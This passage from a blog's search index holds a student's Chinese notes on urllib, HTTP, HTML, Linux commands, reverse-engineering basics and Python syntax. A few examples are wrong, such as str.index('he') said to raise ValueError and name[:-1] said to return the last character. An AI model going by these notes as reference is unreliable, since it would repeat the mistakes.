urljoin可以完成链接的合并：提供一个基础链接作为第一个参数，将新的链接作为第二个参数，此方法会分析基础链接的scheme、netloc和path这三个内容，并对新链接缺失的部分进行补充 import urllib.parse url = &apos;http://www.zzti.edu.cn/index/xwdt/310.htm&apos; print(urllib.parse.urljoin(url,&apos;309.htm&apos;)) #结果 http://www.zzti.edu.cn/index/xwdt/309.htmurlencode函数用浏览器发送请求的时候，如果url中包含了中文或者其他特殊字符，那么浏览器会自动给我们编码。而如果使用代码发送请求，那么就必须手动进行编码，这时候就应该使用urlencode函数来实现。为了更加方便地构造参数，先用字典来表示，转化为URL参数时，只需调用此方法即可 parse_qs函数与urlencode作用相反，将参数转化为字典 quote将内容转化为url编码的格式。url带有中文参数时，可能会导致乱码问题，用此方法可将中文字符转化为url编码 unquote进行url解码]]></content>
      <categories>
        <category>爬虫</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[HTTP的请求和响应]]></title>
    <url>%2F2018%2F07%2F31%2FHTTP%E7%9A%84%E8%AF%B7%E6%B1%82%E5%92%8C%E5%93%8D%E5%BA%94%2F</url>
    <content type="text"><![CDATA[请求请求，由客户端向服务端发出，可以分为四个内容：请求方法、请求的网址、请求头、请求体 请求方法常见的请求方法有两种，GET和POST 在浏览器直接输入一个URL回车，这便是发起了一个GET请求，请求的参数会直接包含到URL里；POST请求大多在表单提交时发起。比如，对于一个登陆表单，输入用户名和密码后，点击登录，这通常会发起一个POST请求，其数据通常以表单的形式传输，而不会体现在URL中 GET请求提交的数据最多只有1024字节，而POST方式没有限制 请求的网址即统一资源定位符URL 请求头用来说明服务器要使用的附加信息，一些常用的头信息有 Accept：指定客户端可以接受那些类型的信息 Accept-Language：指定客户端可接受的语言类型 Accept-Encoding：指定客户端可接受的内容编码 Host：指定请求资源的主机IP和端口号 Cookie Referer：用来标识这个请求是从那个页面发过来的 User-Agent：可以使服务器识别客户使用的操作系统及版本、浏览器及版本等信息 Content-Type：表示具体请求中的媒体类型信息请求体一般承载的内容是POST请求中的表单数据，GET请求体为空 响应响应，由服务器返回给客户端，可以分为三部分：响应状态码、响应头和响应体 响应状态码表示服务器的响应状态 200：服务器成功处理了请求 。。。响应头包含了服务器对请求的应答信息，一些常用的头信息： Date：标识响应产生的时间 Last-Modified：指定资源的最后修改时间 Content-Encoding：指定相应内容的编码 Server：包含服务器的信息 Content-Type：指定的返回的数据类型是什么响应体响应的正文数据都在响应体中]]></content>
      <categories>
        <category>爬虫</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[HTML基础]]></title>
    <url>%2F2018%2F07%2F31%2FHTML%E5%85%A5%E9%97%A8%2F</url>
    <content type="text"><![CDATA[学习HTML的一些基本标签 HTML框架内容&lt;!DOCTYPE&gt;是一个声明，表示该文档是由HTML5进行编写的 声明必须是HTML文档的第一行，位于标签之前 &lt; html &gt;与&lt; /html &gt;标签限定了文档的开始点和结束点，在他们之间是文档的头部和主体 &lt; head &gt;标签用于定义文档的头部，他是所有头部元素的容器 &lt; body &gt;元素包含文档的所有内容，定义了文档的主体 编码： 对于中文网页需要使用 &lt;meta charset=&quot;utf-8&quot;&gt; 声明编码，否则会出现乱码。有些浏览器(如 360 浏览器)会设置 GBK 为默认编码，则你需要设置为 &lt;meta charset=&quot;gbk&quot;&gt; 注释&lt;!-- 这是一条html注释 --&gt;网页标题&lt; title &gt;标签可以设置网页标题 加载图片&lt; img &gt;标签用于在网页上显示图像 &lt; img &gt;标签有两个必须的属性 src：指定显示图像的URL alt：指定图像的代替文本没有结束标志 超链接&lt; a &gt;标签用于定义超链接 &lt; a &gt;标签最重要的属性时href属性，他指定了链接目标的URL 还可以使用target属性（指定在何处打开超链接）的_blank值，可以在新窗口打开超链接 文档样式&lt; style &gt; 标签用于为 HTML 文档定义样式信息。 在头部定义，一般为&lt; style type=&#39;text/css&#39; &gt;，在开始和结束中间写上定义的内容 定义颜色： p {color:grey}定义文本居中： text-align:center定义文本左边距： margin-left:60%定义段缩进： text-indent:32px定义字体大小： font-size:16px定义行高： line-height:32px定义背景： body {background-image:url(&apos;bg.jpg&apos;)}定义格式：可以放在head中 可以在定义段落等的同时定义style &lt; p style=&apos;font-size:20px&apos;&gt;&lt;/p&gt;&lt; span &gt;span 没有特定的样式。只有对它设置样式的时候，才会产生视觉上的表现。 当你想要对局部文本设置样式的时候，span元素就很有用。 换行符用于插入一个换行符 表单&lt; form &gt; 标签用于为用户输入创建 HTML 表单。用于向服务器传输数据。 表单能够包含 input 元素，比如文本字段、复选框、单选框、提交按钮等等。 &lt; input &gt;&lt; input &gt; 标签用于搜集用户信息。 根据不同的 type 属性值，输入字段拥有很多种形式。输入字段可以是文本字段、复选框、掩码后的文本控件、单选按钮、按钮等等。 创建一个输入框： &lt; input type=&apos;text&apos; &gt; 输入最大的长度： maxlength=&apos;10&apos; 在输入框设置好提示： placeholder=&apos;密码不超过十位&apos;创建一个名为‘确认’的按钮： &lt; input type=&apos;submit&apos; value=&apos;确认&apos;&gt;创建单选按钮： &lt; input type=&quot;radio&quot; &gt; name创建password &lt; input type=&quot;password&quot; &gt;重置输入内容 &lt;input type=&apos;reset&apos;&gt;按钮提示鼠标移到按钮上会有提示 &lt; p title=&apos;i am tips&apos; &gt;&lt; input type=&apos;submit&apos;, value=&apos;tips&apos;&gt;&lt;/p&gt;&lt; link &gt;&lt; link &gt; 标签用于指定外部资源。 link 元素最常见的用途是链接样式表: &lt; link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;1.css&quot; &gt;将style中的定义放到‘1.css’中 链接网站图标： &lt; link rel=&apos;icon&apos; type=&apos;image/x-icon&apos; href=&apos;1.ico&apos; &gt;onsubmitonsubmit 属性在提交表单时触发。 onsubmit 属性只在 中使用。 语法 &lt;form onsubmit=&quot;script&quot;&gt;参数描述 script ： onsubmit 发生时运行的脚本。空格&amp;nbsp;&amp;nbsp;&lt; script &gt;&lt; script &gt; 标签用于在 HTML 文档中加入脚本（例如 JavaScript）。 script 元素既可以直接定义内嵌脚本语句，也可以通过 src 属性引用外部脚本文件。 不能在一个script标签里即定义内嵌语句又引入外部脚本 script 元素可以出现在 HTML 文档中的各个部分，一个文档可以包含多个 script 元素。 斜体&lt;i&gt; &lt;/i&gt;按钮在一个表单下创建多个按钮，且跳转页面不同 &lt;form action=&quot;./login.php&quot; method=&quot;post&quot; style=&quot;text-align: center;&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;username&quot; placeholder=&apos;username&apos;&gt;&lt;br&gt; &lt;input type=&quot;password&quot; name=&quot;password&quot; placeholder=&apos;password&apos;&gt;&lt;br&gt; &lt;input type=&apos;submit&apos; value=&quot;login&quot;&gt; &lt;button type=&apos;submit&apos; formaction=&quot;./register.html&quot;&gt;register&lt;/button&gt; &lt;/form&gt;&lt; textarea &gt;定义多行文本输入控件； 可以通过 cols 和 rows 属性来规定 textarea 的尺寸 设置属性readonly=&quot;readonly&quot;可以显示文本而不能修改 可以通过 form 属性设置表单提交的目标路径 &lt;form action=&apos;&apos; id=&quot;messageform&quot;&gt; &lt;p&gt;&lt;textarea rows=&quot;20&quot; cols=&quot;60&quot; name=&quot;username&quot; from=&quot;messageform&quot;&gt;&lt;/textarea&gt;&lt;/p&gt; &lt;p&gt;&lt;input type=&quot;submit&quot; name=&quot;submit&quot;&gt; &lt;input type=&quot;reset&quot; name=&quot;reset&quot;&gt; &lt;/p&gt; &lt;/form&gt;]]></content>
      <categories>
        <category>前端</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[一些链接]]></title>
    <url>%2F2018%2F07%2F30%2F%E4%B8%80%E4%BA%9B%E9%93%BE%E6%8E%A5%2F</url>
    <content type="text"><![CDATA[收藏一些好的文章链接 pip的安装 easygui hexo博客优化 hexo博客优化 把软件添加到右键]]></content>
      <categories>
        <category>other</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[数值前后添加符号的意义]]></title>
    <url>%2F2018%2F07%2F27%2F%E6%95%B0%E5%80%BC%E5%90%8E%E9%9D%A2%E5%8A%A0L%E3%80%81l%E3%80%81U%E3%80%81u%E3%80%81H%E3%80%81h%EF%BC%8CB%E3%80%81b%EF%BC%8C%E6%95%B0%E5%80%BC%E5%89%8D%E9%9D%A2%E5%8A%A00%E5%92%8C0x%E7%9A%84%E6%84%8F%E4%B9%89%2F</url>
    <content type="text"><![CDATA[总算搜到这些东西了！！！赶紧保存下来 一、用于说明数据类型1.数值后面加“L”和“l”（小写的l）的意义是该数值是long型。 详细说如下： 5L的数据类型为long int。 5.12L的数据类型为long double。 2.数值后面加“U”和“u”的意义是该数值是unsigned型。二、用于说明数值表示方法1.数值后面加“”H“、“h”的意义是该数值是用16进制表示的。 2.数值后面加“”B“、“b”的意义是该数值是用2进制表示的。 3.后面什么也不加，代表10进制。 栗子： 11111111B = FFH = 255 4.数值前面加“0”的意义是该数值是八进制。 5.数值前面加“0x”的意义是该数值是十六进制。]]></content>
      <categories>
        <category>逆向</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Linux常用命令]]></title>
    <url>%2F2018%2F07%2F25%2FLinux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%2F</url>
    <content type="text"><![CDATA[日常操作命令 查看当前所在的工作目录的全路径 pwd1 [root@localhost ~]# pwd 2 /root普通用户与root用户guest-4lhi3k@ubuntu:~$ guest-4lhi3k是指当前的用户，ubuntu是指主机名，~是指当前目录，$表示普通用户 切换到root用户： su root查看当前系统的时间date关机/重启关机（必须用root用户） shutdown -h now 立刻关机 shutdown -h +10 10分钟以后关机 shutdown -h 12:00:00 12点整的时候关机重启 shutdown -r now reboot # 等于立刻重启清屏clear 或者用快捷键 ctrl + l退出当前进程ctrl+c ##有些程序也可以用q键退出查看ip等信息ifconfig目录操作查看目录信息ls参数： -a 列出所有文件(包括隐藏文件) -l 显示文件及其详细信息 -al 显示文件(包括隐藏文件)详细信息只加参数时，默认只对当前的文件进行显示操作，在参数后加上文件路径可显示指定文件目录信息: user@user-PC:~/Desktop$ ls -a /var切换工作目录cd [参数] [文件路径]参数： ~ 用户主目录 .. 回退到上级目录 . 当前目录什么都不带，则回到用户的主目录 文件(夹)操作创建文件夹mkdir file 参数： -m 设定权限 -v 每次创建目录都返回信息 -p 递归创建文件夹在Linux系统中，每个文件都具有user、group和others三种身份的权限模式；指定文件权限可用符号方式和八进制方式： r 4 读 w 2 写 x 1 执行创建文件夹时设置权限： user@user-PC:~/Desktop$ mkdir -m 444 -v file mkdir: 已创建目录 &apos;file&apos;递归创建文件夹： mkdir -p file/file1删除空目录rmdir file 移动文件(目录)、修改文件(目录)名称mv命令可以将文件(目录)改名或移动文件(目录) 改名： mv 原文件名 新文件名移动： mv 文件(路径)名 路径将file目录下的所有文件移动到当前目录下： mv file/* .将文件夹files改名为file_change： mv files file_change复制文件(目录)cp 源文件名 目标文件名将file下所有文件复制到当前目录： cp file/* .删除文件(目录)rm [参数] 文件名参数： -r 提示将参数列出的全部目录和子目录均递归删除将目录file及其里面所有文件删除： rm -r file创建文件touch filename 直接创建 cat &gt; filename 创建同时可输入一次显示整个文件cat filename查找文件/文件夹的路径find / -name a.txt在指定文件中搜索特定内容grep [参数] 文件名参数： -v 显示不包含匹配文本的所有行 -n 显示匹配行及行号 -a 不忽略二进制数据查找flag目录下500个txt文件中含有key{的行 cd flag grep -n key{ *输出当前目录绝对路径pwd网络操作常用命令检测主机网络接口状态ping [参数] ip(域名)参数： -c 设置回应次数 -s 设置回应包大小]]></content>
      <categories>
        <category>Linux</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[逆向基础]]></title>
    <url>%2F2018%2F07%2F24%2FSeven-day%2F</url>
    <content type="text"><![CDATA[整理了一丢丢逆向的基础知识 位、字节、字1、位（bit）来自英文bit，音译为“比特”，表示二进制位。位是计算机内部数据储存的最小单位，11010100是一个8位二进制数。一个二进制位只可以表示0和1两种状态；两个二进制位可以表示00、01、10、11四种状态；三位二进制数可表示八种状态2、字节（byte）字节来自英文byte，音译为“拜特”，习惯上用大写的“b”表示。字节是计算机中数据处理的基本单位。计算机中以字节为单位存储和解释信息，规定一个字节由八个二进制位构成，即1个字节等于8个比特（1byte=8bit）。八位二进制数最小为00000000，最大为11111111；通常1个字节可以存入一个ascii码，2个字节可以存放一个汉字国标码。3、字 (word)计算机进行数据处理时，一次存取、加工和传送的数据长度称为字（word）。一个字通常由一个或多个（一般是字节的整数位）字节构成。例如286微机的字由2个字节组成，它的字长为16；486微机的字由4个字节组成，它的字长为32位机。 计算机的字长决定了其cpu一次操作处理实际位数的多少，由此可见计算机的字长越大，其性能越优越。 异或异或运算符为 ∧ ，运算时先将两个数转化为二进制类型的，然后如果两个相应位为‘异’，则值为一，否则为0，如 &gt;&gt;&gt; 2^3 1且异或运算满足交换律 2^3=1 ； 1^3=2 ； 1^2=3 ；汇编与反汇编反汇编(Disassembly)：把目标代码转为汇编代码的过程，也可以说是把机器语言转换为汇编语言代码、低级转高级的意思 汇编大多是指汇编语言，汇编程序。把汇编语言翻译成机器语言的过程称为汇编 静态分析程序运行前需要将硬盘内编译好的程序文件装载进内存，然后将指令送入CPU执行，此时程序就像“复活”一样，按照指令的“先后顺序”开始工作，这便是程序的“动态”。与其相反，静态分析就是在程序尚未运行的状态时进行逆向分析的行为。但是，静态分析并非在硬盘上直接进行，仍需将文件存入内存进行分析，只是此时程序文件只是单纯作为数据被逆向软件加载。 伪代码让人便于理解的代码。不依赖于语言的，用来表示程序执行过程，而不一定能编译运行的代码。 IDA与ODIDA Pro（简称IDA）是一款交互式反汇编工具 ollydbg反汇编工具是一款在Windows平台工作的32/64位调试器，功能就是将目标代码转为汇编代码 区别OD用作动态调试，IDA用作静态分析 IDA使用 1.在出现XREF的地方就是有交叉引用在XREF后面的向上箭头，双击它可以跳到它跳转的地方 2.在代码行右击鼠标选择“添加注释”或直接敲击“；”键 3.空格键可以将代码与流程图间切换 4.IDA伪代码转换插件，可以将汇编语言转换为易读的类似于高级语言的伪代码，将光标放置在汇编代码区，敲击F5键就可将汇编语言转换为伪代码。 ascll码的产生在计算机中，所有的数据在存储和运算时都要使用二进制数表示（因为计算机用高电平和低电平分别表示1和0），例如，像a、b、c、d这样的52个字母（包括大写）、以及0、1等数字还有一些常用的符号（例如*、#、@等）在计算机中存储时也要使用二进制数来表示，而具体用哪些二进制数字表示哪个符号，当然每个人都可以约定自己的一套（这就叫编码），而大家如果要想互相通信而不造成混乱，那么大家就必须使用相同的编码规则，于是美国有关的标准化组织就出台了ASCII编码，统一规定了上述常用符号用哪些二进制数来表示。 十六进制十六进制是逢十六进10,1,2,3,4,5,6,7,8,9,a,b,c,d,e,f表示个位，其中a,b,c,d,e,f分别表示十进制中的10,11,12,13,14,15，在十六进制小于十六的都是用一位来表示，当数等于16的时候就要进位了，变成了10，我们为了和十进制区别，在10前面加0x10,表示这个数是用16进制表示的，那么0x10由于是逢16进一，所以0x10表示的不是10，而是16，所以0x2a=2x16+a=2x16+10=42 \x表示后面的字符是十六进制数 python中的chr函数chr() 用一个范围在 range（256）内的（就是0～255）整数作参数，返回一个对应的字符。语法 以下是 chr() 方法的语法: chr(i)参数 i -- 可以是10进制也可以是16进制的形式的数字。返回值是当前整数对应的ascii字符。 python中的ord函数ord() 函数是 chr() 函数（对于8位的ASCII字符串）或 unichr() 函数（对于Unicode对象）的配对函数，它以一个字符（长度为1的字符串）作为参数，返回对应的 ASCII 数值，或者 Unicode 数值，如果所给的 Unicode 字符超出了你的 Python 定义范围，则会引发一个 TypeError 的异常。语法 以下是 ord() 方法的语法: ord(c)参数 c -- 字符。返回值是对应的十进制整数。]]></content>
      <categories>
        <category>逆向</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Python基础知识]]></title>
    <url>%2F2018%2F07%2F22%2FPython%E5%9F%BA%E7%A1%80%2F</url>
    <content type="text"><![CDATA[大一结束，把这学期做的python笔记整到博客上 python2与3区别 print语句在Python 2里，print是一个语句。无论你想输出什么，只要将它们放在print关键字后边就可以。 在Python 3里，print()是一个函数。就像其他的函数一样，print()需要你将想要输出的东西作为参数传给它。 notes Python 2 Python 3 1 print print() 2 print 1 print(1) 3 print 1, 2 print(1, 2) 4 print 1, 2, print(1, 2, end=’ ‘) 为输出一个空白行，需要调用不带参数的print()。 为输出一个单独的值，需要将这这个值作为print()的一个参数就可以了。 为输出使用一个空格分隔的两个值，用两个参数调用print()即可。 在Python 2里，如果使用一个逗号(,)作为print语句的结尾，它将会用空格分隔输出的结果，然后在输出一个尾随的空格，而不输出回车。在Python 3里，通过把end=’ ‘作为一个关键字参数传给print()可以实现同样的效果。参数end的默认值为’\n’，所以通过重新指定end参数的值，可以取消在末尾输出回车符。 一行输入多个数用name.split()的方法，将空格隔开的字符串分成单一的部分，再进行转换数据类型 sum = raw_input(&apos;&apos;) x,y,a = sum.split() x = float(x) y = float(y) a = int(a) 除Python2.x 里，整数除整数，只能得出整数。如果要得到小数部分，把其中一个数改成浮点数即可。 &gt;&gt;&gt; 5/2 2 &gt;&gt;&gt; 5/2.0 2.5 &gt;&gt;&gt; 5//2 2 &gt;&gt;&gt; 5//2.0 2.0比较运算符Python 2支持&lt;&gt;作为!=的同义词。Python 3只支持!=，不再支持&lt;&gt;了。 Python 2 Python 3 if x &lt;&gt; y: if x != y: if x != y: 基础语法1.注释 以＃进行单行注释;使用三重引号 &apos;&apos;&apos; &apos;&apos;&apos;进行多行注释2.语句换行 在末尾加\3.缩进 缩进的空格数是可变的，但同一个代码块的语句必须包含相同的缩进空格数。4.变量的数据类型 数字类型：包括整型，浮点型，复数类型。 布尔类型：布尔类型是特殊的整型，它的值只有两个，分别是True和False。如果将布尔值进行数值运算，True会被当做整型1，False会被当做整型0。 字符串类型：python中字符串被定义为一个字符集合，它被引号所包含，引号可以是单引号、双引号、或者三引号。字符串具有索引规则，第一个字符的索引是0。 列表和元祖类型 字典类型：映射数据类型5.科学计数法 实数E（e）整数。如：1.34E3 表示1.34*10^36.运算符 算术运算符 *：两数相乘或返回一个被重复若干次的字符串 / ： 除 // ： 整除 ** ： 次幂 求绝对值：abs(), fabs()(abs()是一个内置函数，而fabs()在math模块中定义的) 赋值运算符 a,b = b,a 两数值交换 不支持自增自减操作符 += 加赋值运算，除此还有-=、=、/=、%=、*=、//= 比较运算符 == 相等 != 不相等 、&lt;、&gt;=、&lt;= 逻辑运算符 and 布尔“与” or 布尔“或” not 布尔“非” 成员运算符 in ：如果在指定的序列中找到值返回True，否则返回False not in ：如果在指定的序列中没找到值返回True，否则返回False 位运算符 &lt;&lt; 按位左移：二进制位全部左移n位，高位丢弃，低位补0 按位右移：二进制位全部右移n位，移出的位丢弃，移进的位补0 &amp; 按位与：两个数的二进制按位运算，都为1时结果为1,否则为0 | 按位或：两个数的二进制按位运算，有一个为1时结果为1，都为0时结果才为0 ^ 按位异或：两个数的二进制按位运算，相同时结果为0，否则为1 ~ 按位取反：将二进制的每一位取反，0转换成1,1转换成0 常用语句判断语句 if语句 if 判断语句 ： 执行1 elif 判断语句: 执行2 else ： 执行n if-elif语句 if 判断条件1: doing elif 判断条件2： doing 注意当满足判断条件1时，执行满足条件1时要做的事情，然后整个if结束。 elif必须和if一起使用，否则程序会出错。 循环语句 while循环 while 判断式 : 表达式 for循环 for 变量 in 序列: 循环语句 判断语句和循环语句需注意(1)每个条件后要使用冒号： ，表示接下来是满足条件后要执行的语句。 (2)使用缩进来划分语句块，相同缩进数的语句在一起组成一个语句块。 其他语句1.break 结束整个循环（当前循环体）2.continue 结束本次循环，紧接着执行下一次的循环 注意： （1） break/continue 只能用在循环中，除此以外不能单独使用 （2）break/continue 在嵌套循环中，只对最近的一层循环起作用 3.pass 空语句，保持程序结构的完整性 4.else python中的while和for循环中也可以使用else语句，在循环中使用时，else语句只在循环完成后执行数据类型相关函数转换函数ord() 返回字符的ASCII编码 chr() 返回指定编码的字符 bin() 十进制数转换成二进制数 oct() 十进制数转换成八进制数 hex() 十进制数转换成十六进制数 int() 转换成整数 float() 转换成浮点数 str() 转换成字符串 complex() 创建复数 数据类型 获取数据类型 type() 比较数据类型是否一致 isinstance(a,b) 字符串什么是字符串字符串是一种表示文本的数据类型，字符串中的字符可以是ASCLL字符、各种符号以及各种Unicode字符。 表现方式 使用单引号包含字符，注意：单引号表示的字符串里不能包含单引号 使用双引号包含字符，注意：双引号表示的字符串里不能包含双引号，并且只能有一行 使用三引号包含字符，注意：三个引号能包含多行字符串，并常常用来注释注意与c语言不同的是，python字符串不能被改变，例如，word[0]=’m’会导致错误 转义字符 1. 三种引号混合使用 2. 反斜杠转义其后的特殊字符 3. 在字符串前添加r，表示原始字符串 字符串操作&gt;&gt;&gt; print(&apos;*&apos;*10) ********** &gt;&gt;&gt; print(&apos;i&apos;+&apos;love&apos;+&apos;you&apos;) iloveyou #字符串可以与数字n相乘，得到n个重复字符串 #字符串之间可以相加进行拼接，但不可以相减字符串的输入和输出字符串输入 a = input(&apos;&apos;) input 函数接收的输入会直接赋值给等号左边的变量a。input 函数获取的数据，即使是数字，也是以字符串的方式进行保存的。则进行整数输入：a = int(input(‘’)) 字符串输出 print(&apos;&apos;)格式化符号 %s 通过str()字符串转换来格式化 %d 十进制正数 %f 浮点实数 例 name = &apos;xiaoming&apos; print(&apos;我叫%s&apos;%name)输出不换行 print(&apos;hello&apos;, end=&apos;&apos;) 访问字符串中的值字符串的储存方式 python不支持单字符类型，单字符在python也是作为一个字符串使用。每个字符都对应着一个编号，并且编号是从0开始的，如果要从字符串中取出字符，可以通过下标获取，例如，a = &apos;abcde&apos;,取出c：print(a[2])使用切片截取字符串 name = &apos;abcdef&apos; print(name[0:3]) #取下标为0~2的字符， 即print(name[:3]) print(name[3:5]) #取下标为3~4的字符，即 print(name[3:]) 注意：从0开始或末尾结束，可省略不写 print(name[1:-1]) #取下标为1开始到倒数第2个字符之间的字符 print(name[:-1]) #取倒数第一位字符 print(name[::-1]) #字符串逆序 字符串内建函数find ：检测字符串中是否包含子字符串，如果包含子字符串则返回开始的索引值，否则返回-1(可选开始与结束位置) str = &apos;hello it is it&apos; &gt;&gt;&gt; print(str.find(&apos;it&apos;)) 6rfind：检测字符串中是否包含子字符串，如果包含子字符串则返回最后的索引值，否则返回-1(可选开始与结束位置) str = &apos;hello it is it&apos; &gt;&gt;&gt; print(str.rfind(&apos;it&apos;)) 12index ：检测字符串中是否包含子字符串，如果包含子字符串则返回开始的索引值，否则抛出异常 (可选开始与结束位置) str = &apos;hello it is it&apos; &gt;&gt;&gt; print(str.index(&apos;he&apos;)) ValueErrorcount : 统计字符串里某字符出现的次数 (可选开始与结束位置) str = &apos;hello it is it&apos; &gt;&gt;&gt; print(str.count(&apos;it&apos;)) 2replace ：旧字符串替换成新字符串，如果指定第三个参数，则替换次数不会超过这个参数指定的次数.替换后原字符串并未发生改变 str = &apos;hello it is it&apos; &gt;&gt;&gt; print(str.replace(&apos;it&apos;,&apos;he&apos;,1)) hello he is itsplit ：通过指定分隔符对字符串进行切片，分隔符默认为所有空字符;若有指定值，则分割相应的次数.分割后原字符串并未发生改变（返回列表） str = &apos;hello it is it&apos; &gt;&gt;&gt; print(str.split()) [&apos;hello&apos;, &apos;it&apos;, &apos;is&apos;, &apos;it&apos;] &gt;&gt;&gt; print(str.split(&apos;i&apos;)) [&apos;hello &apos;, &apos;t &apos;, &apos;s &apos;, &apos;t&apos;] &gt;&gt;&gt; print(str.split(&apos;i&apos;,1)) [&apos;hello &apos;, &apos;t is it&apos;]capitalize ：将字符串第一个字母变成大写，其他字母变小写改变后原字符串并未发生改变 str = &apos;hello it is it&apos; &gt;&gt;&gt; print(str.capitalize()) Hello it is ittitle ：所有单词均以大写开始，其余字母均为小写 str = &apos;hello it is it&apos; &gt;&gt;&gt; print(str.title()) Hello It Is Itstartswith ：检查字符串是否以指定字符串开头(可选开始与结束位置) str = &apos;hello it is it&apos; &gt;&gt;&gt; print(str.startswith(&apos;he&apos;)) Trueendswith ：检查字符串是否以指定字符串结尾(可选开始与结束位置) str = &apos;hello it is it&apos; &gt;&gt;&gt; print(str.endswith(&apos;it&apos;)) Trueupper ：将小写字母转化为大写字母 str = &apos;hello it is it&apos; &gt;&gt;&gt; print(str.upper()) HELLO IT IS ITljust : 原字符串左对齐，并使用空格填充至指定长度；如果指定的长度小于原字符串的长度，则返回原字符串 str = &apos;hello it is me&apos; &gt;&gt;&gt; print(str.ljust(30,&apos;*&apos;)) hello it is me****************rjust : 原字符串右对齐，并使用空格填充至指定长度；如果指定的长度小于原字符串的长度，则返回原字符串 str = &apos;hello it is me&apos; &gt;&gt;&gt; print(str.rjust(30,&apos;*&apos;)) ****************hello it is me列表列表是python中的一种数据结构，它可以储存不同类型的数据 列表内元素的操作1、添加 append( ) # 在列表的末尾新增元素 extend( ) # 将一个列表中的元素全部添加到另一个列表 insert(index,object) # 在列表的指定位置添加元素 2、查找 in 存在 not in 不存在例 a = [&apos;hi&apos;,&apos;hello&apos;] &gt;&gt;&gt; &apos;hi&apos;in a True3、修改通过修改下标来修改列表中的元素 &gt;&gt;&gt; a[0] = &apos;haha&apos; &gt;&gt;&gt; a [&apos;haha&apos;, &apos;hello&apos;]4、 删除 del name[index] 根据下标进行删除 pop（）删除最后一个元素 remove（）根据元素的值进行删除 5 、删除列表 del name6、重复操作符‘*’ &gt;&gt;&gt; a = [0] &gt;&gt;&gt; s2 = a*19 &gt;&gt;&gt; s2 [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]元素排序排序默认为：数字从小到大，字母按首位顺序 反序：reverse() a = [1,2,3] a.reverse() a [3, 2, 1] # or for i in reversed(range(1,4)): print(i,end=&apos;&apos;) # 321 sort（）对列表永久排序 a = [2,4,1,3] a.sort() a [1, 2, 3, 4] sorted（）对列表临时排序 a = [2,4,1,3] print(sorted(a)) [1, 2, 3, 4] a [2, 4, 1, 3] 列表遍历for与while遍历 for遍历：常与range搭配使用range()特点：左闭右开,可以生成一个数字序列 for循环然后遍历这个范围，for i in range(1,5)相当于 for i in [1, 2, 3, 4]，这就像把序列中的每一个数(或对象)分配给i，一次一个,然后为每个i值执行该语句块。 提供两个数字，range返回一个从第一个数字到第二个数字的一个数字序列。例如，range(1,5)给出序列[1, 2, 3, 4]。默认情况下，range 步距取为1。如果我们提供第三个数字，range那么它变成了步距。例如range(1,5,2)得到[1,3]。请记住，范围扩展到第二号码，即它不包括第二个数字。 注意 range()生成一个数字序列，当for循环请求下一个项目时，它一次只生成一个数字。如果你想立刻看到完整的数字序列,使用list(range())。 &gt;&gt;&gt; for each in range(1,10): print(each,end = &apos;&apos;) 123456789while遍历，常与len搭配使用len(列表名)：获取列表的长度 2.利用zip函数，同时遍历多个列表 a = [&apos;n1&apos;,&apos;n2&apos;,&apos;n3&apos;,&apos;n4&apos;] for m,n in zip(range(1,5),a): print(m,&apos;:&apos;,n) 1 : n1 2 : n2 3 : n3 4 : n4列表解析式 用append方法向列表添加元素 a = [] for i in range(11): a.append(i) print(a) [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10] 列表解析式（在执行效率上远远超过append） a = [i for i in range(11)] print(a) [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10] a = [i**3 for i in range(11)] print(a) [0, 1, 8, 27, 64, 125, 216, 343, 512, 729, 1000] a = [i for i in range(11) if i%2 == 0] print(a) [0, 2, 4, 6, 8, 10]列表切片切片并不改变原列表，相当于拷贝后的操作 左闭右开 从0开始或末尾结束，可省略不写 a = [1,2,3,4] print(a[:2]) print(a[1:]) [1, 2] [2, 3, 4] 拷贝 a = [1,2,3,4] b = a[:] print(b) [1, 2, 3, 4] 实现字符串的逆序 a = [1,2,3,4] b = a[::-1] print(b) [4, 3, 2, 1] 取字符串末位 a = [1,2,3,4] b = a[-1] print(b) 4 元组元组与列表类似，不同之处在于，元组的元素不能修改，元组使用圆括号包含元素，而列表使用方括号包含元素访问元祖可以使用下表索引来访问元祖中的值修改元组1.元组中的元素值是不允许修改的，但我们可以对元组进行连接组合 a = (1,2) b = (3,4) print(a+b) (1, 2, 3, 4)2.python不允许修改元组的数据，包括不能删除其中的元素 3.带括号的不一定是元组，不带括号的不一定不是元组 &gt;&gt;&gt; a = (1) &gt;&gt;&gt; print(type(a)) &lt;class &apos;int&apos;&gt; &gt;&gt;&gt; b = 1,2,3 &gt;&gt;&gt; print(type(b)) &lt;class &apos;tuple&apos;&gt;逗号才是关键！ 可以这样创建一个空元祖 a = ()怎样创建一个只有一个元素的元组呢？ a = (1,) a = 1,4.通过拼接的方法修改元组里的值（实际上是创建一个新的元组） &gt;&gt;&gt; a = (&apos;1&apos;,&apos;2&apos;,&apos;3&apos;) &gt;&gt;&gt; a = (&apos;6&apos;,) + a[1:] #注意要加括号和逗号！ &gt;&gt;&gt; a (&apos;6&apos;, &apos;2&apos;, &apos;3&apos;)遍历元组while for 序列列表、字符串、元组的共同点 1.都可以通过索引得到每一个元素 2.默认索引值都是从0开始 3.可以通过分片的方法得到一个范围内的元素的集合 4.有很多共同的操作符方法 len() ： 计算元素个数 max() ： 返回最大值（数字返回最大值，字母返回其对应ascll值最大值所对应的字母） min() ： 返回最小值 #max和min中元素的类型要为同一种类型 tuple() ： 转为元祖 list() ： 转为列表 sum() : 返回数据类型序列的和字典定义：字典的每个元素都是由两部分组成的，分别是键和值。 例，a = {&apos;name&apos;:&apos;boy&apos;,&apos;score&apos;:&apos;80&apos;} 其中，&apos;name&apos;为键，&apos;boy&apos;为值。键必须是唯一的，但值可以是任何类型的 根据键访问值info = {&apos;name&apos;:&apos;xiaoming&apos;} print(info[&apos;name&apos;]) # 